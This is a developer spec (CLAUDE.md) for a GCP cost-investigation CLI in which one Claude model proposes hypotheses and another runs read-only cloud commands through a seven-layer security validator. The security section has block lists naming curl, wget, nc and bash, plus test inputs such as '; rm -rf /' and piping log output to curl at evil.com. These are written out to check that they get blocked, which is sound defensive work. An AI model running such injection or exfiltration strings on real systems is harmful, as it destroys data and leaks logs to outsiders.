# CLAUDE.md — Ghosthunter v1.0

## What This Is

Ghosthunter is a CLI tool that investigates *why* cloud costs spiked, not just *what* changed. It uses Claude Opus to form hypotheses about cost anomalies and Claude Sonnet to execute read-only cloud commands that test those hypotheses.

**v1.0 scope: GCP only, supervised mode only, 4-week timeline.**

## Architecture

```
┌─────────────────┐
│   CLI (Typer)   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐     ┌─────────────────┐
│  Investigator   │────▶│ Hypothesis Mgr  │
│   (main loop)   │     │ (2-4 competing) │
└────────┬────────┘     └─────────────────┘
         │
         ▼
┌─────────────────┐
│  Dual Model     │
│  ┌───────────┐  │
│  │   Opus    │  │  ← Reasoning: form hypotheses, design commands, interpret
│  │ (reasoner)│  │
│  └─────┬─────┘  │
│        │        │
│        ▼        │
│  ┌───────────┐  │
│  │  Sonnet   │  │  ← Execution: validate commands, run them, compress output
│  │ (executor)│  │
│  └───────────┘  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Security Layer  │  ← 7 layers, CANNOT be bypassed
│ (validates ALL  │
│  commands)      │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  GCP Provider   │  ← Billing fetch (BigQuery client), command execution
└─────────────────┘
```

## Dual-Model Pattern

**Why two models:**
- Opus is smart but expensive (~$15/M input, ~$75/M output)
- Sonnet is fast and cheap (~$3/M input, ~$15/M output)
- Sonnet compresses command output before sending to Opus
- Result: Opus reasons over summaries (~5K tokens), not raw JSON (50K+ tokens)

**Opus responsibilities:**
- Form 2-4 competing hypotheses with confidence scores
- Design investigation commands to test hypotheses
- Interpret evidence and update confidence
- Conclude when one hypothesis reaches 85%+

**Sonnet responsibilities:**
- Final validation of commands before execution (semantic check)
- Execute commands in sandbox
- Compress output to key findings (500 lines → 5 lines)
- Never reasons about hypotheses — just executes and summarizes

**Critical: Opus never sees raw command output.** All output passes through Sonnet compression first. This prevents context explosion and keeps Opus focused.

## Security Model — 7 Layers

Commands flow through ALL layers in order. Failure at any layer = blocked.

```
Layer 1: Fast Reject   — Obvious dangerous stuff (curl, rm, bash, semicolons)
Layer 2: Allowlist     — Primary gate: command must match an allowed pattern
Layer 3: Pipe Valid.   — Safe pipes only (sort, grep, wc, jq, head, tail)
Layer 4: Safety Checks — Length limits (<2000 chars), no encoding tricks
Layer 5: Budget Limits — Hard caps on commands (15), cost ($1), time (10min)
Layer 6: Sonnet Valid. — Semantic "is this really safe?" check
Layer 7: Sandbox Exec  — Restricted execution environment
```

**Design principle:** Security is in CODE, not prompts. The LLM cannot bypass these layers regardless of what it outputs.

**Allowlist is the primary gate.** The blocklist (Layer 1) is just a fast-reject for obvious dangerous patterns — it doesn't need to catch `gcloud compute instances delete` because that command simply won't match any allowlist pattern. This makes the security model easier to reason about and test.

**Why this ordering matters:**
- Old approach: Blocklist with `r"\b(run|set|enable)\b"` would block `gcloud run services list` before it reached allowlist
- New approach: Layer 1 only catches shell injection (`; && | curl bash rm`), allowlist handles the rest
- If a command doesn't match any allowlist pattern, it's blocked — no blocklist entry needed

## File Structure

```
ghosthunter/
├── src/ghosthunter/
│   ├── __init__.py
│   ├── cli.py             # Typer CLI: init, investigate, demo, audit
│   ├── config.py          # Config management (~/.ghosthunter/config.toml)
│   ├── investigator.py    # Main loop: spike selection → hypothesis → commands → conclude
│   ├── hypothesis.py      # Hypothesis dataclass, confidence updates, spawning
│   ├── evidence.py        # Evidence chain, links evidence to hypotheses
│   ├── models/
│   │   ├── __init__.py
│   │   ├── reasoner.py    # Opus client, system prompts, hypothesis management
│   │   └── executor.py    # Sonnet client, validation, compression
│   ├── security/
│   │   ├── __init__.py
│   │   ├── blocklist.py   # Blocked patterns (GCP only for v1.0)
│   │   ├── allowlist.py   # Allowed patterns (GCP only for v1.0)
│   │   ├── pipes.py       # Safe pipe validation
│   │   └── validator.py   # Orchestrates all 7 layers
│   ├── providers/
│   │   ├── __init__.py
│   │   └── gcp.py         # BigQuery billing fetch, gcloud command execution
│   ├── ui.py              # Rich-based terminal UI (hypothesis bars, audit log)
│   └── demo.py            # Demo mode with bundled sample data
├── tests/
│   ├── test_security.py   # MUST have comprehensive security tests
│   ├── test_hypothesis.py
│   └── test_pipes.py
├── sample_data/
│   ├── billing.json       # Synthetic billing showing DNS spike
│   └── logs.json          # Synthetic DNS logs showing attack pattern
└── pyproject.toml
```

## Key Implementation Details

### Billing Data Flow

```python
# Initial spike detection uses Python BigQuery client directly
# This is NOT a shell command — it's the investigator's setup phase
from google.cloud import bigquery

def fetch_billing_spikes(project_id: str, lookback_days: int = 30):
    """Fetch billing data and identify significant cost changes."""
    client = bigquery.Client(project=project_id)
    query = """
        SELECT service, cost, date
        FROM `{project}.billing_export.gcp_billing_export_v1`
        WHERE date >= DATE_SUB(CURRENT_DATE(), INTERVAL @lookback DAY)
    """
    # Returns structured data, NOT passed through security layers
```

```python
# Investigation commands ARE shell commands, passed through security
# Opus proposes these, user approves, Sonnet executes
command = "gcloud logging read 'resource.type=dns_query' --limit=2000"
# → Layer 1-7 validation
# → User approval (supervised mode)
# → Sonnet execution
# → Sonnet compression
# → Opus receives summary
```

### bq query Handling

`bq query` IS allowed but constrained. The query must be a SELECT statement.

```python
# In allowlist.py — flexible flag ordering
# Matches: bq query 'SELECT...', bq query --nouse_legacy_sql 'SELECT...',
#          bq query --format=json --use_legacy_sql=false 'SELECT...'
r"^bq\s+query\s+.*['\"]SELECT\b",
```

**Additional validation in Layer 4:** After regex match, explicitly check the query doesn't contain INSERT, UPDATE, DELETE, DROP, CREATE, ALTER, TRUNCATE. This is defense in depth — the regex catches obvious cases, the string check catches edge cases like `SELECT * FROM table; DROP TABLE`.

```python
def validate_bq_query(command: str) -> bool:
    """Extra validation for bq query commands."""
    if not command.startswith("bq query"):
        return True  # Not a bq query, skip this check
    
    dangerous_keywords = ["INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "TRUNCATE", "GRANT", "REVOKE"]
    command_upper = command.upper()
    return not any(kw in command_upper for kw in dangerous_keywords)
```

### Hypothesis Lifecycle

```python
@dataclass
class Hypothesis:
    id: str                    # H1, H2, H3...
    description: str           # "DNS cache bypass attack"
    confidence: int            # 0-100
    evidence_for: list[str]    # Evidence IDs that support
    evidence_against: list[str]  # Evidence IDs that refute
    status: Literal["active", "eliminated", "confirmed"]

# Confidence updates
def update_confidence(hypothesis: Hypothesis, evidence: Evidence):
    if evidence.supports(hypothesis):
        hypothesis.confidence = min(100, hypothesis.confidence + evidence.weight)
    elif evidence.refutes(hypothesis):
        hypothesis.confidence = max(0, hypothesis.confidence - evidence.weight)
    
    if hypothesis.confidence >= 85:
        hypothesis.status = "confirmed"
    elif hypothesis.confidence <= 5:
        hypothesis.status = "eliminated"
```

### Context Compression

Sonnet compresses ALL command output before Opus sees it:

```python
COMPRESSION_PROMPT = """
Compress this command output to ONLY the facts relevant to the investigation.

Investigation target: {target}
Current hypotheses: {hypotheses}
Command that produced this: {command}

Raw output:
{output}

Return ONLY:
1. Key numbers (counts, sizes, costs) with exact values
2. Patterns relevant to hypotheses
3. Anomalies that might spawn new hypotheses

Do NOT include:
- Raw JSON structure
- Repeated/redundant entries
- Fields irrelevant to cost investigation

Keep response under 500 tokens.
"""
```

### Hallucination Prevention

Opus system prompt enforces evidence-based reasoning:

```python
REASONER_SYSTEM_PROMPT = """
## CRITICAL RULES

1. NEVER GUESS. If you don't have evidence, say "I need to verify X"

2. EVERY claim must cite evidence:
   ❌ "The Lambda functions are causing high NAT costs"
   ✓ "The Lambda functions MAY be causing high NAT costs. Evidence needed: [specific command]"

3. CONFIDENCE LEVELS:
   - CONFIRMED: Direct evidence proves this
   - LIKELY: Strong indicators, not proven
   - HYPOTHESIS: Reasonable guess, needs verification
   - UNKNOWN: No data yet

4. All numbers must come from command output. NEVER invent statistics.

5. You CAN say "I don't know" or "The evidence is inconclusive."
"""
```

### Opus Response Format

Opus uses tool_use to return structured responses. This is critical — Claude Code must implement this exact interface.

```python
# Define the tool for Opus
INVESTIGATION_TOOL = {
    "name": "investigation_step",
    "description": "Report current hypotheses and propose next action",
    "input_schema": {
        "type": "object",
        "properties": {
            "hypotheses": {
                "type": "array",
                "items": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "string"},           # H1, H2, H3
                        "description": {"type": "string"},
                        "confidence": {"type": "integer"},  # 0-100
                        "status": {"type": "string", "enum": ["active", "eliminated", "confirmed"]},
                        "evidence_for": {"type": "array", "items": {"type": "string"}},
                        "evidence_against": {"type": "array", "items": {"type": "string"}}
                    },
                    "required": ["id", "description", "confidence", "status"]
                }
            },
            "reasoning": {
                "type": "string",  # Opus explains its thinking
                "description": "Brief explanation of how evidence affected hypotheses"
            },
            "next_action": {
                "type": "object",
                "properties": {
                    "type": {"type": "string", "enum": ["command", "conclude", "need_info"]},
                    "command": {"type": "string"},           # If type=command
                    "tests_hypothesis": {"type": "string"},  # Which hypothesis this tests
                    "rationale": {"type": "string"},         # Why this command helps
                    "conclusion": {                          # If type=conclude
                        "type": "object",
                        "properties": {
                            "root_cause": {"type": "string"},
                            "confidence": {"type": "integer"},
                            "evidence_summary": {"type": "array", "items": {"type": "string"}},
                            "not_verified": {"type": "array", "items": {"type": "string"}},
                            "recommendations": {"type": "array", "items": {"type": "string"}}
                        }
                    }
                },
                "required": ["type"]
            }
        },
        "required": ["hypotheses", "next_action"]
    }
}
```

**Example Opus response (mid-investigation):**
```json
{
    "hypotheses": [
        {
            "id": "H1",
            "description": "DNS cache bypass attack",
            "confidence": 78,
            "status": "active",
            "evidence_for": ["E1: 94% queries from public resolvers", "E2: random case variations"],
            "evidence_against": []
        },
        {
            "id": "H2",
            "description": "Misconfigured resolver",
            "confidence": 18,
            "status": "active",
            "evidence_for": [],
            "evidence_against": ["E1: pattern inconsistent with misconfiguration"]
        }
    ],
    "reasoning": "The random case variations strongly indicate cache bypass. Legitimate traffic wouldn't vary case. H1 confidence increased from 60% to 78%.",
    "next_action": {
        "type": "command",
        "command": "gcloud logging read 'resource.type=dns_query AND timestamp>=\"2026-03-27\"' --limit=1000 --format=json",
        "tests_hypothesis": "H1",
        "rationale": "Checking if attack started on March 27 correlating with cost spike"
    }
}
```

**Example Opus response (concluding):**
```json
{
    "hypotheses": [
        {
            "id": "H1",
            "description": "DNS cache bypass attack",
            "confidence": 92,
            "status": "confirmed",
            "evidence_for": ["E1", "E2", "E3", "E4"],
            "evidence_against": []
        }
    ],
    "reasoning": "All evidence points to DNS cache bypass attack. Confidence exceeds 85% threshold.",
    "next_action": {
        "type": "conclude",
        "conclusion": {
            "root_cause": "DNS Cache Bypass Attack",
            "confidence": 92,
            "evidence_summary": [
                "436M queries/day to 2 domains (vs 2M normal baseline)",
                "94% of queries from public resolvers (8.8.8.8, 1.1.1.1)",
                "Random case variations detected (cache bypass technique)",
                "Attack started March 27, correlates with cost spike"
            ],
            "not_verified": [
                "Attacker identity (cannot determine from DNS logs)",
                "Exact attack vector (direct queries vs amplification)"
            ],
            "recommendations": [
                "Enable Cloud Armor rate limiting on DNS",
                "Consider Cloudflare for DDoS protection",
                "Monitor for attack resumption after mitigation"
            ]
        }
    }
}
```

**Processing Opus response:**
```python
async def process_opus_response(response) -> InvestigationStep:
    """Extract structured data from Opus tool_use response."""
    for block in response.content:
        if block.type == "tool_use" and block.name == "investigation_step":
            return InvestigationStep(**block.input)
    
    raise ValueError("Opus did not return investigation_step tool call")
```

### Demo Mode

Demo runs against bundled sample data AND pre-recorded LLM responses. **Truly $0 — no API calls.**

```python
# cli.py
@app.command()
def demo():
    """Run investigation against sample data. No setup required, no API costs."""
    # 1. Load sample_data/billing.json and logs.json
    # 2. Mock the GCP provider to return sample data
    # 3. Mock Opus/Sonnet with pre-recorded responses (no API calls)
    # 4. Replay the full investigation flow with realistic timing
    # 5. Show: spike detection → hypothesis formation → commands → conclusion
```

**Why pre-recorded responses (not live API):**
- Zero friction: works offline, no API key needed, no cost
- Reproducible: same demo every time, good for screenshots/videos
- Fast: no API latency, can show the full flow in 30 seconds

**Trade-off:** The demo is a replay, not a live investigation. Users see what Ghosthunter *can* do, not Ghosthunter actually doing it. This is fine — the demo's job is to show the UX and build confidence before setup.

**Demo script structure:**
```python
# sample_data/demo_script.json
{
    "billing_data": { ... },  # What fetch_billing_spikes() returns
    "investigation_steps": [
        {
            "step": 1,
            "opus_response": {
                "hypotheses": [...],
                "next_action": {"type": "command", "command": "gcloud logging read..."}
            },
            "command_output": "...",  # What the command would return
            "sonnet_compression": "..."  # What Sonnet summarizes it to
        },
        {
            "step": 2,
            ...
        },
        {
            "step": 8,
            "opus_response": {
                "hypotheses": [...],
                "next_action": {"type": "conclude", "conclusion": {...}}
            }
        }
    ]
}
```

The demo walks through the DNS cache bypass attack scenario:
- Cloud DNS spike: +847% ($12K → $117K)
- Hypotheses: DNS attack (60%), misconfigured resolver (25%), legitimate growth (15%)
- Evidence: 436M queries/day, 94% from public resolvers, random case patterns
- Conclusion: DNS cache bypass attack (92% confidence)

**Demo UI:** Same Rich UI as real investigations, but with a subtle `[DEMO]` indicator so users know it's a replay.

## GCP Allowlist (v1.0)

Only these command patterns are permitted. Everything else is blocked by default.

**Pattern design:** All patterns use `\b` word boundary at the action verb, then `.*` or end-of-pattern to allow arbitrary trailing flags like `--format=json`, `--project=`, `--filter=`, `--limit=`, etc.

### Billing & Cost
```python
r"^gcloud\s+billing\s+accounts\s+list\b",
r"^gcloud\s+billing\s+accounts\s+describe\b",
r"^gcloud\s+billing\s+projects\s+list\b",
r"^gcloud\s+billing\s+budgets\s+list\b",
r"^gcloud\s+billing\s+budgets\s+describe\b",
r"^bq\s+ls\b",
r"^bq\s+show\b",
r"^bq\s+head\b",
r"^bq\s+query\s+.*['\"]SELECT\b",  # SELECT only, flexible flag ordering
```

### Compute Engine
```python
r"^gcloud\s+compute\s+instances\s+list\b",
r"^gcloud\s+compute\s+instances\s+describe\b",
r"^gcloud\s+compute\s+instance-templates\s+list\b",
r"^gcloud\s+compute\s+instance-groups\s+list\b",
r"^gcloud\s+compute\s+instance-groups\s+list-instances\b",
r"^gcloud\s+compute\s+machine-types\s+list\b",
r"^gcloud\s+compute\s+disks\s+list\b",
r"^gcloud\s+compute\s+disks\s+describe\b",
r"^gcloud\s+compute\s+snapshots\s+list\b",
r"^gcloud\s+compute\s+images\s+list\b",
r"^gcloud\s+compute\s+zones\s+list\b",
r"^gcloud\s+compute\s+regions\s+list\b",
```

### Networking
```python
r"^gcloud\s+compute\s+networks\s+list\b",
r"^gcloud\s+compute\s+networks\s+describe\b",
r"^gcloud\s+compute\s+networks\s+subnets\s+list\b",
r"^gcloud\s+compute\s+firewall-rules\s+list\b",
r"^gcloud\s+compute\s+firewall-rules\s+describe\b",
r"^gcloud\s+compute\s+routers\s+list\b",
r"^gcloud\s+compute\s+routers\s+describe\b",
r"^gcloud\s+compute\s+routers\s+get-status\b",
r"^gcloud\s+compute\s+routers\s+get-nat-mapping-info\b",
r"^gcloud\s+compute\s+routers\s+nats\s+describe\b",
r"^gcloud\s+compute\s+routes\s+list\b",
r"^gcloud\s+compute\s+addresses\s+list\b",
r"^gcloud\s+compute\s+forwarding-rules\s+list\b",
r"^gcloud\s+compute\s+backend-services\s+list\b",
r"^gcloud\s+compute\s+backend-services\s+get-health\b",
r"^gcloud\s+compute\s+health-checks\s+list\b",
r"^gcloud\s+compute\s+url-maps\s+list\b",
r"^gcloud\s+compute\s+vpn-gateways\s+list\b",
r"^gcloud\s+compute\s+vpn-tunnels\s+list\b",
```

### GKE
```python
r"^gcloud\s+container\s+clusters\s+list\b",
r"^gcloud\s+container\s+clusters\s+describe\b",
r"^gcloud\s+container\s+node-pools\s+list\b",
r"^gcloud\s+container\s+node-pools\s+describe\b",
r"^gcloud\s+container\s+operations\s+list\b",
r"^gcloud\s+container\s+images\s+list\b",
```

### Cloud Storage (metadata only)
```python
r"^gcloud\s+storage\s+buckets\s+list\b",
r"^gcloud\s+storage\s+buckets\s+describe\b",
r"^gcloud\s+storage\s+ls\b",
r"^gsutil\s+ls\b",
r"^gsutil\s+du\b",
r"^gsutil\s+stat\b",
```

### Cloud SQL
```python
r"^gcloud\s+sql\s+instances\s+list\b",
r"^gcloud\s+sql\s+instances\s+describe\b",
r"^gcloud\s+sql\s+databases\s+list\b",
r"^gcloud\s+sql\s+backups\s+list\b",
r"^gcloud\s+sql\s+operations\s+list\b",
```

### Cloud Functions / Run
```python
r"^gcloud\s+functions\s+list\b",
r"^gcloud\s+functions\s+describe\b",
r"^gcloud\s+functions\s+logs\s+read\b",
r"^gcloud\s+run\s+services\s+list\b",
r"^gcloud\s+run\s+services\s+describe\b",
r"^gcloud\s+run\s+revisions\s+list\b",
```

### Logging
```python
r"^gcloud\s+logging\s+read\b",
r"^gcloud\s+logging\s+logs\s+list\b",
r"^gcloud\s+logging\s+metrics\s+list\b",
r"^gcloud\s+logging\s+metrics\s+describe\b",
r"^gcloud\s+logging\s+sinks\s+list\b",
r"^gcloud\s+logging\s+resource-descriptors\s+list\b",
```

### Monitoring
```python
r"^gcloud\s+monitoring\s+dashboards\s+list\b",
r"^gcloud\s+monitoring\s+dashboards\s+describe\b",
r"^gcloud\s+monitoring\s+metrics\s+list\b",
r"^gcloud\s+monitoring\s+channels\s+list\b",
r"^gcloud\s+monitoring\s+policies\s+list\b",
r"^gcloud\s+monitoring\s+policies\s+describe\b",
```

### DNS
```python
r"^gcloud\s+dns\s+managed-zones\s+list\b",
r"^gcloud\s+dns\s+managed-zones\s+describe\b",
r"^gcloud\s+dns\s+record-sets\s+list\b",
r"^gcloud\s+dns\s+policies\s+list\b",
```

### IAM (read-only)
```python
r"^gcloud\s+iam\s+service-accounts\s+list\b",
r"^gcloud\s+iam\s+service-accounts\s+describe\b",
r"^gcloud\s+iam\s+roles\s+list\b",
r"^gcloud\s+iam\s+roles\s+describe\b",
r"^gcloud\s+projects\s+get-iam-policy\b",
r"^gcloud\s+projects\s+list\b",
r"^gcloud\s+projects\s+describe\b",
```

### Pub/Sub
```python
r"^gcloud\s+pubsub\s+topics\s+list\b",
r"^gcloud\s+pubsub\s+topics\s+describe\b",
r"^gcloud\s+pubsub\s+subscriptions\s+list\b",
r"^gcloud\s+pubsub\s+subscriptions\s+describe\b",
```

### Config
```python
r"^gcloud\s+config\s+list\b",
r"^gcloud\s+config\s+get-value\b",
r"^gcloud\s+auth\s+list\b",
r"^gcloud\s+info\b",
```

## Fast-Reject Patterns (Layer 1)

Layer 1 is a fast-reject for obvious dangerous stuff. It does NOT try to catch all destructive GCP commands — that's the allowlist's job.

```python
FAST_REJECT_PATTERNS = [
    # Shell injection
    r";",              # Command chaining
    r"&&",             # AND chaining
    r"\|\|",           # OR chaining
    
    # Command substitution (but NOT $ alone — gcloud filters use $KEY syntax)
    r"\$\(",           # $(command)
    r"`",              # `command`
    r"\$\{",           # ${variable}
    
    # Redirects — only match when NOT inside quotes
    # These are checked separately with quote-aware logic, not simple regex
    # See validate_redirects() below
    
    # Obvious dangerous commands (not GCP-specific)
    r"\bcurl\b",
    r"\bwget\b",
    r"\bnc\b",
    r"\bnetcat\b",
    r"\bssh\b",
    r"\bscp\b",
    r"\brsync\b",
    r"\brm\b",
    r"\brmdir\b",
    r"\bmkdir\b",
    r"\bchmod\b",
    r"\bchown\b",
    r"\bdd\b",
    r"\bpython\b",
    r"\bpython3\b",
    r"\bnode\b",
    r"\bbash\b",
    r"\bsh\b",
    r"\beval\b",
    
    # Encoding tricks
    r"\\x[0-9a-fA-F]{2}",  # Hex
    r"\\[0-7]{3}",         # Octal
    r"%[0-9a-fA-F]{2}",    # URL encoding
    r"\bbase64\b",
]

def validate_redirects(command: str) -> bool:
    """
    Check for redirect operators (> >> <) outside of quoted strings.
    Returns True if command is safe (no unquoted redirects).
    
    This handles cases like:
    - BLOCKED: gcloud compute instances list > /tmp/out
    - ALLOWED: gcloud logging read --filter="timestamp>'2026-03-01'"
    - ALLOWED: gcloud compute instances list --filter="cpuUtilization>0.8"
    """
    in_single_quote = False
    in_double_quote = False
    i = 0
    
    while i < len(command):
        char = command[i]
        
        # Track quote state
        if char == "'" and not in_double_quote:
            in_single_quote = not in_single_quote
        elif char == '"' and not in_single_quote:
            in_double_quote = not in_double_quote
        
        # Check for redirects only when outside quotes
        elif char in '<>' and not in_single_quote and not in_double_quote:
            return False  # Found unquoted redirect
        
        i += 1
    
    return True  # No unquoted redirects found
```

**What's NOT in fast-reject:**
- GCP destructive verbs like `delete`, `create`, `update` — allowlist handles these
- `$` alone — gcloud `--filter` expressions use `$KEY` syntax legitimately
- `|` alone — pipes are validated by Layer 3 (safe targets only)
- Words like `run`, `set`, `enable` — these appear in legitimate commands
- `>` and `<` inside quotes — these are comparison operators in filter expressions

**The principle:** If you're not sure whether to blocklist something, don't. The allowlist will catch it.

## Safe Pipe Patterns

These pipes ARE allowed after read-only commands:

```python
SAFE_PIPE_PATTERNS = [
    r"\|\s*wc\s+-l",                    # | wc -l
    r"\|\s*wc\b",                        # | wc
    r"\|\s*sort\b",                      # | sort
    r"\|\s*sort\s+-[rn]+\b",            # | sort -rn
    r"\|\s*uniq\b",                      # | uniq
    r"\|\s*uniq\s+-c\b",                # | uniq -c
    r"\|\s*head\s+-?\d+",               # | head -30
    r"\|\s*head\b",                      # | head
    r"\|\s*tail\s+-?\d+",               # | tail -100
    r"\|\s*tail\b",                      # | tail
    r"\|\s*grep\s+['\"]?[^;|&]+['\"]?", # | grep "pattern"
    r"\|\s*grep\s+-[iv]+\b",            # | grep -i
    r"\|\s*tr\s+\[:[a-z]+:\]\s+\[:[a-z]+:\]",  # | tr '[:upper:]' '[:lower:]'
    r"\|\s*cut\b",                       # | cut
    r"\|\s*awk\b",                       # | awk
    r"\|\s*jq\s+['\"][^'\"]+['\"]",     # | jq '.field'
    r"\|\s*jq\s+-r\b",                   # | jq -r
]

BLOCKED_PIPE_TARGETS = [
    r"\|\s*curl\b",
    r"\|\s*wget\b",
    r"\|\s*nc\b",
    r"\|\s*bash\b",
    r"\|\s*sh\b",
    r"\|\s*python\b",
    r"\|\s*xargs\b",
    r"\|\s*tee\b",
    r"\|\s*dd\b",
    r"\|\s*>\s*",
    r"\|\s*mail\b",
]
```

## Testing Requirements

**Security tests are non-negotiable.** See the TDD section in Build Order above for the comprehensive test suite that must be written FIRST.

Additional test files needed:

```python
# test_hypothesis.py
def test_confidence_increases_with_supporting_evidence():
    ...

def test_confidence_decreases_with_refuting_evidence():
    ...

def test_hypothesis_confirmed_at_85_percent():
    ...

def test_hypothesis_eliminated_at_5_percent():
    ...

# test_pipes.py  
def test_all_safe_patterns_compile():
    """Verify regex patterns are valid."""
    ...

def test_blocked_targets_comprehensive():
    """Verify all dangerous pipe targets are blocked."""
    ...
```

## What NOT to Build in v1.0

- AWS provider (v1.1)
- Azure provider (v1.2)
- Autonomous mode (v1.1, with strict guardrails)
- Multi-account support (v2.0 SaaS)
- Scheduled investigations (v1.2)
- Slack/Teams integration (v2.0)

## Dependencies

```toml
[tool.poetry.dependencies]
python = "^3.11"
anthropic = "^0.40.0"
typer = {extras = ["all"], version = "^0.12.0"}
rich = "^13.7.0"
google-cloud-bigquery = "^3.25.0"
google-cloud-logging = "^3.10.0"
pydantic = "^2.7.0"
tomli = "^2.0.0"
tomli-w = "^1.0.0"

[tool.poetry.group.dev.dependencies]
pytest = "^8.0.0"
pytest-asyncio = "^0.23.0"
ruff = "^0.4.0"
```

## Build Order

1. **Security interface + tests first** — Define `validator.is_allowed(command: str) -> ValidationResult`, write comprehensive tests, THEN implement. TDD pays off here because you're codifying your security contract before implementation.
2. **GCP provider** (`providers/gcp.py`) — billing fetch and command execution
3. **Models** (`models/`) — Opus reasoner and Sonnet executor
4. **Hypothesis/Evidence** — data structures and update logic
5. **Investigator** — main loop tying it together
6. **CLI** — user-facing commands
7. **UI** — Rich-based display
8. **Demo** — sample data and mock provider

### Security TDD Approach

```python
# Write these tests FIRST, then implement validator to pass them

# test_security.py
import pytest
from ghosthunter.security.validator import SecurityValidator, ValidationResult

@pytest.fixture
def validator():
    return SecurityValidator()

class TestFastReject:
    """Layer 1: Fast-reject obvious dangerous patterns."""
    
    def test_blocks_semicolon_chaining(self, validator):
        result = validator.is_allowed("gcloud compute instances list; rm -rf /")
        assert not result.allowed
        assert "semicolon" in result.reason.lower()
    
    def test_blocks_curl(self, validator):
        assert not validator.is_allowed("curl http://evil.com").allowed
    
    def test_blocks_command_substitution(self, validator):
        assert not validator.is_allowed("gcloud compute instances list $(whoami)").allowed
    
    def test_allows_dollar_in_filter(self, validator):
        # $KEY in --filter is legitimate gcloud syntax
        cmd = "gcloud compute instances list --filter='labels.env=prod'"
        assert validator.is_allowed(cmd).allowed
    
    def test_blocks_unquoted_redirect(self, validator):
        result = validator.is_allowed("gcloud compute instances list > /tmp/out")
        assert not result.allowed
    
    def test_allows_redirect_inside_quotes(self, validator):
        # > inside filter is a comparison operator, not redirect
        cmd = """gcloud logging read --filter="timestamp>'2026-03-01'" """
        assert validator.is_allowed(cmd).allowed
    
    def test_allows_comparison_in_filter(self, validator):
        # Common pattern: filter by numeric threshold
        cmd = """gcloud compute instances list --filter="cpuUtilization>0.8" """
        assert validator.is_allowed(cmd).allowed

class TestAllowlist:
    """Layer 2: Primary gate — must match allowed pattern."""
    
    def test_allows_instances_list(self, validator):
        assert validator.is_allowed("gcloud compute instances list").allowed
    
    def test_allows_with_format_flag(self, validator):
        assert validator.is_allowed("gcloud compute instances list --format=json").allowed
    
    def test_allows_with_filter_flag(self, validator):
        assert validator.is_allowed("gcloud compute instances list --filter='status=RUNNING'").allowed
    
    def test_blocks_instances_delete(self, validator):
        result = validator.is_allowed("gcloud compute instances delete my-vm")
        assert not result.allowed
        assert "not in allowlist" in result.reason.lower()
    
    def test_allows_cloud_run_list(self, validator):
        # Regression: 'run' was blocked by old blocklist
        assert validator.is_allowed("gcloud run services list").allowed
    
    def test_allows_bq_select(self, validator):
        assert validator.is_allowed("bq query 'SELECT * FROM dataset.table'").allowed
    
    def test_allows_bq_select_with_flags(self, validator):
        assert validator.is_allowed("bq query --format=json --nouse_legacy_sql 'SELECT * FROM t'").allowed
    
    def test_blocks_bq_insert(self, validator):
        assert not validator.is_allowed("bq query 'INSERT INTO t VALUES (1)'").allowed

class TestPipeValidation:
    """Layer 3: Safe pipes only."""
    
    def test_allows_safe_pipes(self, validator):
        assert validator.is_allowed("gcloud logging read 'x' | head -30 | wc -l").allowed
    
    def test_allows_jq_pipe(self, validator):
        assert validator.is_allowed("gcloud compute instances list --format=json | jq '.[]'").allowed
    
    def test_blocks_curl_pipe(self, validator):
        result = validator.is_allowed("gcloud logging read | curl http://evil.com")
        assert not result.allowed
    
    def test_blocks_bash_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | bash").allowed
    
    def test_blocks_xargs_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | xargs rm").allowed

class TestEdgeCases:
    """Edge cases and regression tests."""
    
    def test_blocks_encoded_command(self, validator):
        # Hex-encoded 'delete'
        assert not validator.is_allowed("gcloud compute instances \\x64elete vm").allowed
    
    def test_blocks_long_command(self, validator):
        # Commands over 2000 chars are suspicious
        long_cmd = "gcloud compute instances list " + "A" * 2000
        assert not validator.is_allowed(long_cmd).allowed
    
    def test_handles_empty_command(self, validator):
        assert not validator.is_allowed("").allowed
    
    def test_handles_whitespace_only(self, validator):
        assert not validator.is_allowed("   ").allowed
```

## Commands to Remember

```bash
# Run tests
poetry run pytest

# Run specific test file
poetry run pytest tests/test_security.py -v

# Lint
poetry run ruff check src/

# Run CLI during development
poetry run python -m ghosthunter.cli investigate

# Build for distribution
poetry build
```

## Sample Data Structure

### billing.json
```json
{
  "period": {
    "start": "2026-03-01",
    "end": "2026-03-31"
  },
  "services": [
    {
      "name": "Cloud DNS",
      "current_cost": 117000,
      "previous_cost": 12000,
      "change_percent": 847,
      "daily_breakdown": [...]
    },
    {
      "name": "Compute Engine",
      "current_cost": 45000,
      "previous_cost": 36500,
      "change_percent": 23
    },
    {
      "name": "Cloud NAT",
      "current_cost": 8200,
      "previous_cost": 3200,
      "change_percent": 156
    }
  ]
}
```

### logs.json (DNS attack simulation)
```json
{
  "dns_queries": {
    "total_daily": 436000000,
    "normal_baseline": 2000000,
    "top_queried_domains": [
      {"domain": "example.com", "queries": 218000000, "variations": ["ExAmPlE.cOm", "EXAMPLE.com", "eXaMpLe.COM"]},
      {"domain": "api.example.com", "queries": 218000000}
    ],
    "source_resolvers": {
      "8.8.8.8": 0.42,
      "8.8.4.4": 0.31,
      "1.1.1.1": 0.21,
      "internal": 0.06
    },
    "attack_start_date": "2026-03-27",
    "case_variation_detected": true
  }
}
```

### demo_script.json (pre-recorded investigation)
```json
{
  "metadata": {
    "description": "DNS cache bypass attack investigation",
    "total_steps": 8,
    "simulated_duration_seconds": 272
  },
  "steps": [
    {
      "step": 1,
      "delay_seconds": 2,
      "opus_response": {
        "hypotheses": [
          {"id": "H1", "description": "DNS cache bypass attack", "confidence": 60, "status": "active"},
          {"id": "H2", "description": "Misconfigured resolver", "confidence": 25, "status": "active"},
          {"id": "H3", "description": "Legitimate traffic growth", "confidence": 15, "status": "active"}
        ],
        "next_action": {
          "type": "command",
          "command": "gcloud logging read 'resource.type=dns_query' --limit=2000 --format=json",
          "tests_hypothesis": "H1",
          "rationale": "Check query patterns for signs of cache bypass"
        }
      },
      "simulated_command_output": "... 2000 log entries ...",
      "sonnet_compression": "94% of queries from public resolvers (8.8.8.8, 1.1.1.1). Random case variations detected in domain names."
    }
  ]
}
```
